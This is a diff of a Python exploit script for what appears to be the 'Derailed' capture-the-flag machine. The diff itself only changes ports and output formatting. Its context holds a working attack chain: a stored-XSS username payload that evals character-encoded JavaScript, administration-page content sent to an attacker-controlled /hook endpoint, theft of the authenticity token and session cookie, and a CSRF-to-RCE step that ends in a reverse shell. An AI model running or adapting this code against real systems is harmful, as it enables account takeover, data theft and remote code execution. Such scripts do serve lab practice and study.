@@ -15,7 +15,7 @@ if not attacker_machine or not port:
     print("Attacker IP and port are required. Exiting...")
     exit()
 
-print(f"You will receive a reverse shell on port {port}")
+print(f"You will receive a reverse shell on port {port}\n")
 
 session = requests.Session()
 response = session.get("http://10.10.11.190:3000/register")
@@ -27,12 +27,11 @@ proxies = {
    'http': 'http://127.0.0.1:8080'
 }
 
-
 #------------------------Register User Part ------------------------
 
 js_file = f"""
 var url = "http://derailed.htb:3000/administration";
-var coder = "http://{attacker_machine}:9999/hook";
+var coder = "http://{attacker_machine}:9191/hook";
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {{
     if (xhr.readyState == XMLHttpRequest.DONE) {{
@@ -47,7 +46,7 @@ xhr.send(null);
 character_codes = [str(ord(char)) for char in js_file]
 character_codes = ", ".join(character_codes)
 
-username = f"""sssssaaasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://{attacker_machine}/imgfail' onerror="eval(String.fromCharCode({character_codes}))">
+username = f"""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://{attacker_machine}/imgfail' onerror="eval(String.fromCharCode({character_codes}))">
 """
 password = "anything"
 register_data = {
@@ -59,7 +58,7 @@ register_data = {
 
 register_response = session.post("http://10.10.11.190:3000/register", data=register_data)
 if register_response.status_code == 200:
-    print(f"{Fore.GREEN}User registration successful!{Style.RESET_ALL}\n\n")
+    print(f"{Fore.GREEN}User registration successful!{Style.RESET_ALL}")
 else:
     print("User registration failed. Status code:", register_response.status_code)
     exit()
@@ -78,14 +77,14 @@ login_data = {
 }
 login_response = session.post("http://10.10.11.190:3000/login", data=login_data)
 if login_response.status_code == 200:
-    print(f"{Fore.GREEN}User login successful!{Style.RESET_ALL}\n\n")
+    print(f"{Fore.GREEN}User login successful!{Style.RESET_ALL}\n")
 
     # Get the _simple_rails_session cookie from session cookies
     cookies = session.cookies
     if "_simple_rails_session" in cookies:
         session_cookie = cookies["_simple_rails_session"]
         #Additionally, you can use the '_simple_rails_session' to log in as the user that created it.
-        print(f"simple_rails_session user 1 ({Fore.RED}XSS for administrator contents{Style.RESET_ALL}):\n\n",session_cookie,"\n\n")
+        print(f"simple_rails_session user 1 ({Fore.RED}XSS for administrator contents{Style.RESET_ALL}):\n",session_cookie,"\n")
     else:
         print("Unable to retrieve _simple_rails_session cookie")
 else:
@@ -167,7 +166,7 @@ class StoppableHTTPServer(HTTPServer):
             self.handle_request()
 
 # Create an HTTP server with the custom request handler
-server_address = ('', 9999)
+server_address = ('', 9191)
 httpd = StoppableHTTPServer(server_address, CustomRequestHandler)
 
 # Start the server in a separate thread
@@ -187,6 +186,7 @@ if hasattr(httpd, 'authenticity_token') and hasattr(httpd, 'report_log'):
     report_log = httpd.report_log
     print("authenticity_token:", authenticity_token)
     print("report_log:", report_log)
+    print("\n")
 else:
     print("Data not received.")
 
@@ -220,7 +220,7 @@ authenticity_token_r2 = soup.find("input", {"name": "authenticity_token"}).get("
 character_codes_2 = [str(ord(char)) for char in js_CSRF_RCE]
 character_codes_2 = ", ".join(character_codes_2)
 
-username_2 = f"""sssssaaasasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://{attacker_machine}/imgfail' onerror="eval(String.fromCharCode({character_codes_2}))">
+username_2 = f"""aaaaaaaaaasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://{attacker_machine}/imgfail' onerror="eval(String.fromCharCode({character_codes_2}))">
 """
 register_data_2 = {
     "authenticity_token": authenticity_token_r2,
@@ -231,7 +231,7 @@ register_data_2 = {
 
 register_response_2 = session.post("http://10.10.11.190:3000/register", data=register_data_2)
 if register_response_2.status_code == 200:
-    print(f"{Fore.GREEN}User registration_ successful!{Style.RESET_ALL}\n\n")
+    print(f"{Fore.GREEN}User registration_ successful!{Style.RESET_ALL}")
 else:
     print("User registration_2 failed. Status code:", register_response_2.status_code)
     exit()
@@ -247,13 +247,13 @@ login_data_2 = {
 }
 login_response_2 = session.post("http://10.10.11.190:3000/login", data=login_data_2)
 if login_response_2.status_code == 200:
-    print(f"{Fore.GREEN}User login successful!{Style.RESET_ALL}\n\n")
+    print(f"{Fore.GREEN}User login successful!{Style.RESET_ALL}\n")
 
     # Get the _simple_rails_session cookie from session cookies
     cookies = session.cookies
     if "_simple_rails_session" in cookies:
         session_cookie = cookies["_simple_rails_session"]
-        print(f"simple_rails_session user 2 ({Fore.RED}CSRF RCE{Style.RESET_ALL}):\n\n",session_cookie,"\n\n")
+        print(f"simple_rails_session user 2 ({Fore.RED}CSRF RCE{Style.RESET_ALL}):\n",session_cookie,"\n")
     else:
         print("Unable to retrieve _simple_rails_session user 2 cookie")
 else:
@@ -302,7 +302,7 @@ report_request = session.post(url="http://10.10.11.190:3000/report/", headers=he
 if report_request.status_code == 200:
     print(f"{Fore.GREEN}Report clipnote successful!{Style.RESET_ALL}")
     print("\n")
-    print(f"You will get a shell on port {port} after one minute(Make sure you have already set it up).")
+    print(f"You will get a shell on port {port} after one minute({Fore.RED}Make sure you have already set it up).{Style.RESET_ALL}")
 else:
     print("Failed to create report to admin. Status code:", report_request.status_code)
     exit()
